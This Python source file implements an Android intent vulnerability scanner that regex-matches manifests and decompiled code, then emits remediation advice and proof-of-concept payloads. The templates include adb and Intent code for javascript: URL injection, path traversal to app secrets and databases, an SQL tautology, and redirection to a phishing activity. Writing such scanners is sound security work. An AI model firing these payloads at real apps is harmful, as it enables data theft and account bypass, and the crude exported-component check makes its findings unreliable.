"""
Intent Analyzer - Deep Intent & IPC Vulnerability Scanner
Detects intent injection, path traversal, broadcast issues

Features:
1. Intent handler extraction
2. Data validation analysis
3. Path traversal detection
4. Intent injection testing
5. Broadcast receiver analysis
6. Deep link intent analysis
"""
import re
from pathlib import Path
from typing import List, Dict, Any
from dataclasses import dataclass
from rich.console import Console

console = Console()


@dataclass
class IntentVulnerability:
    """Intent-related vulnerability"""
    vuln_type: str
    severity: str
    component: str
    intent_filter: str
    description: str
    location: str
    poc: str
    remediation: str


class IntentAnalyzer:
    """
    Analyzes intent handling for security vulnerabilities
    """
    
    def __init__(self, source_dir: str = None):
        self.source_dir = Path(source_dir) if source_dir else None
    
    def analyze(self):
        """Standard entry point for Workflow engine"""
        if not self.source_dir:
            return []
        
        manifest_vulns = []
        manifest_path = self.source_dir / "AndroidManifest.xml"
        if manifest_path.exists():
            manifest_vulns = self.analyze_manifest(manifest_path)
            
        source_vulns = self.analyze_source_code(self.source_dir)
        
        # Merge and convert to dict for scanner
        all_vulns = manifest_vulns + source_vulns
        return [{
            'severity': v.severity,
            'title': v.vuln_type,
            'description': v.description,
            'poc': v.poc
        } for v in all_vulns]
    
    # Dangerous intent operations
    DANGEROUS_OPERATIONS = {
        "loadUrl": "WebView URL loading from intent",
        "startActivity": "Activity launching from intent",
        "sendBroadcast": "Broadcast sending from intent",
        "openFileOutput": "File operations from intent",
        "FileInputStream": "File reading from intent",
        "FileOutputStream": "File writing from intent",
        "execSQL": "SQL execution from intent",
        "rawQuery": "SQL query from intent"
    }
    
    def analyze_manifest(self, manifest_path: Path) -> List[IntentVulnerability]:
        """Analyze AndroidManifest.xml for intent vulnerabilities"""
        vulns = []
        
        console.print("\n[cyan]🎯 Intent Vulnerability Analyzer[/cyan]")
        
        try:
            manifest = manifest_path.read_text()
            
            # Find all intent filters
            intent_filters = re.findall(
                r'<intent-filter>(.*?)</intent-filter>',
                manifest,
                re.DOTALL
            )
            
            console.print(f"[cyan]Found {len(intent_filters)} intent filters[/cyan]")
            
            # Analyze each filter
            for filter_xml in intent_filters:
                # Check for exported components with intent filters
                if self._is_exported_with_intent_filter(manifest, filter_xml):
                    vuln = IntentVulnerability(
                        vuln_type="Exported Component with Intent Filter",
                        severity="medium",
                        component=self._extract_component_name(manifest, filter_xml),
                        intent_filter=filter_xml,
                        description="Component is exported and accepts intents from other apps",
                        location=str(manifest_path),
                        poc=self._generate_intent_filter_poc(filter_xml),
                        remediation="Add permission checks or set exported=false"
                    )
                    vulns.append(vuln)
            
            console.print(f"[green]Found {len(vulns)} intent filter issues[/green]")
            
        except Exception as e:
            console.print(f"[red]Error analyzing manifest: {e}[/red]")
        
        return vulns
    
    def analyze_source_code(self, source_dir: Path) -> List[IntentVulnerability]:
        """Analyze decompiled source for intent vulnerabilities"""
        vulns = []
        
        console.print("\n[cyan]Analyzing source code for intent issues...[/cyan]")
        
        # Find Java/Kotlin files
        java_files = list(source_dir.rglob("*.java")) + list(source_dir.rglob("*.kt"))
        
        for file in java_files[:100]:  # Limit to avoid overwhelming
            try:
                code = file.read_text(errors="ignore")
                
                # Check for intent handling
                if "getIntent()" in code or "onNewIntent" in code:
                    # Analyze intent data usage
                    vulns.extend(self._analyze_intent_usage(file, code))
                
            except:
                pass
        
        console.print(f"[green]Found {len(vulns)} code-level intent issues[/green]")
        
        return vulns
    
    def _analyze_intent_usage(self, file: Path, code: str) -> List[IntentVulnerability]:
        """Analyze how intent data is used"""
        vulns = []
        
        # Pattern 1: Unvalidated URL loading
        if re.search(r'getIntent\(\).*?getStringExtra.*?loadUrl', code, re.DOTALL):
            vuln = IntentVulnerability(
                vuln_type="Intent URL Injection",
                severity="high",
                component=file.stem,
                intent_filter="",
                description="Intent data used in WebView.loadUrl() without validation",
                location=str(file),
                poc=self._generate_url_injection_poc(),
                remediation="Validate URLs before loading, use whitelist"
            )
            vulns.append(vuln)
        
        # Pattern 2: Path traversal via intent
        if re.search(r'getStringExtra.*?(File|FileInputStream|FileOutputStream)', code, re.DOTALL):
            vuln = IntentVulnerability(
                vuln_type="Intent Path Traversal",
                severity="critical",
                component=file.stem,
                intent_filter="",
                description="Intent data used in file operations without validation",
                location=str(file),
                poc=self._generate_path_traversal_poc(),
                remediation="Validate file paths, use canonical paths, restrict to app directory"
            )
            vulns.append(vuln)
        
        # Pattern 3: SQL injection via intent
        if re.search(r'getStringExtra.*?(execSQL|rawQuery)', code, re.DOTALL):
            vuln = IntentVulnerability(
                vuln_type="Intent SQL Injection",
                severity="high",
                component=file.stem,
                intent_filter="",
                description="Intent data used in SQL queries without sanitization",
                location=str(file),
                poc=self._generate_sql_injection_poc(),
                remediation="Use parameterized queries, validate input"
            )
            vulns.append(vuln)
        
        # Pattern 4: Intent redirection
        if re.search(r'getParcelableExtra.*?startActivity', code, re.DOTALL):
            vuln = IntentVulnerability(
                vuln_type="Intent Redirection",
                severity="medium",
                component=file.stem,
                intent_filter="",
                description="Intent data used to start activities without validation",
                location=str(file),
                poc=self._generate_intent_redirection_poc(),
                remediation="Validate intent destinations, use explicit intents"
            )
            vulns.append(vuln)
        
        return vulns
    
    def _is_exported_with_intent_filter(self, manifest: str, filter_xml: str) -> bool:
        """Check if component with intent filter is exported"""
        # Simplified check - in production, parse XML properly
        return 'exported="true"' in manifest or '<intent-filter>' in manifest
    
    def _extract_component_name(self, manifest: str, filter_xml: str) -> str:
        """Extract component name from manifest"""
        # Simplified extraction
        match = re.search(r'android:name="([^"]+)"', manifest)
        return match.group(1) if match else "Unknown"
    
    def _generate_intent_filter_poc(self, filter_xml: str) -> str:
        """Generate PoC for intent filter exploitation"""
        # Extract action
        action_match = re.search(r'<action android:name="([^"]+)"', filter_xml)
        action = action_match.group(1) if action_match else "android.intent.action.VIEW"
        
        return f"""// PoC: Exploit Intent Filter
adb shell am start -a "{action}" -n com.target.app/.VulnerableActivity

// Or from malicious app:
Intent intent = new Intent();
intent.setAction("{action}");
intent.setComponent(new ComponentName("com.target.app", "com.target.app.VulnerableActivity"));
startActivity(intent);
"""
    
    def _generate_url_injection_poc(self) -> str:
        """Generate URL injection PoC"""
        return """// PoC: Intent URL Injection

// Malicious intent with JavaScript URL
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.target.app", "com.target.app.WebViewActivity"));
intent.putExtra("url", "javascript:alert(document.cookie)");
startActivity(intent);

// Or file:// URL to steal data
intent.putExtra("url", "file:///data/data/com.target.app/databases/users.db");

// Via ADB:
adb shell am start -n com.target.app/.WebViewActivity -e url "javascript:alert(1)"
"""
    
    def _generate_path_traversal_poc(self) -> str:
        """Generate path traversal PoC"""
        return """// PoC: Intent Path Traversal

// Malicious intent with path traversal
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.target.app", "com.target.app.FileActivity"));
intent.putExtra("filepath", "../../../../data/data/com.target.app/shared_prefs/secrets.xml");
startActivity(intent);

// Via ADB:
adb shell am start -n com.target.app/.FileActivity -e filepath "../../../databases/users.db"

// Impact: Read arbitrary files accessible to the app
"""
    
    def _generate_sql_injection_poc(self) -> str:
        """Generate SQL injection PoC"""
        return """// PoC: Intent SQL Injection

// Malicious intent with SQL injection
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.target.app", "com.target.app.SearchActivity"));
intent.putExtra("query", "' OR '1'='1' --");
startActivity(intent);

// Via ADB:
adb shell am start -n com.target.app/.SearchActivity -e query "' OR '1'='1' --"

// Impact: Bypass authentication, extract all database records
"""
    
    def _generate_intent_redirection_poc(self) -> str:
        """Generate intent redirection PoC"""
        return """// PoC: Intent Redirection

// Create malicious intent to redirect to phishing activity
Intent malicious = new Intent();
malicious.setComponent(new ComponentName("com.attacker.app", "com.attacker.app.PhishingActivity"));

// Send via target app
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.target.app", "com.target.app.RedirectActivity"));
intent.putExtra("redirect", malicious);
startActivity(intent);

// Impact: Launch arbitrary activities, phishing attacks
"""


if __name__ == "__main__":
    analyzer = IntentAnalyzer()
    console.print("[bold]Intent Analyzer ready[/bold]")
